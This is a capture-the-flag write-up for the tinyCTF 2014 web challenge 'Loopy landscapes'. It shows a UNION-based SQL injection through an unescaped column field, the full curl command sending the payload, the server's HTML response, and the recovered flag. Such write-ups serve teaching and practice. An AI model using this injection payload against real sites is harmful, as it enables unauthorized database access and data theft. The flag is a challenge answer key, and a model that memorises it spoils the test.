# tinyCTF 2014: What is Loopy landscapes?

**Category:** Web
**Points:** 200
**Description:**

> <http://54.69.118.120:8000/>

## Write-up

The `column` field on the website is vulnerable to SQL injection. It seems like the query being executed has the format:

```sql
SELECT name, park, country, height FROM rollercoaster WHERE $column LIKE %$value%;
```

…where `$column` is not escaped properly, but `$value` is.

After some manual fiddling, the final payload looks like this: `park = 0 AND 1=0 UNION ALL SELECT 1,hash,3,4 from flag#`.

```bash
$ curl --data "value=x&column=park%20%3D%200%20AND%201%3D0%20UNION%20ALL%20SELECT%201%2Chash%2C3%2C4%20from%20flag%23" 'http://54.69.118.120:8000/index.php'
<html>
    <head>
        <title>Archie's Roller Coaster Page</title>
        <link href='http://fonts.googleapis.com/css?family=EB+Garamond' rel='stylesheet' type='text/css'>
        <link rel="stylesheet" type="text/css" href="style.css"/>
    </head>
    <body>
        <div id="header">Archie's Coasters</div>
        <div id="search" class="whitebox">
            <form name="search" action="index.php" method="post">
                Search for
                <input name="value" type="text" placeholder="Search value"/>
                in
                <select name="column">
                    <option value="name">name</option>
                    <option value="park">park</option>
                    <option value="country">country</option>
                </select>
                <input type="submit" value="Go"/>
            </form>
        </div>
        <div id="content" class="whitebox">
            <table>
                <tr>
                    <th>
                        Name
                    </th>
                    <th>
                        Park
                    </th>
                    <th>
                        Country
                    </th>
                    <th>
                        Height
                    </th>

                </tr><tr><td>1</td><td>flag{unroll_those_loops}</td><td>3</td><td>4 m</td></tr></table>
        </div>
    </body>
</html>
```

The flag is `flag{unroll_those_loops}`.

## Other write-ups and resources

* <https://github.com/jesstess/tinyctf/blob/master/loopy/loopy.md>
* <http://barrebas.github.io/blog/2014/10/03/tinyctf/>
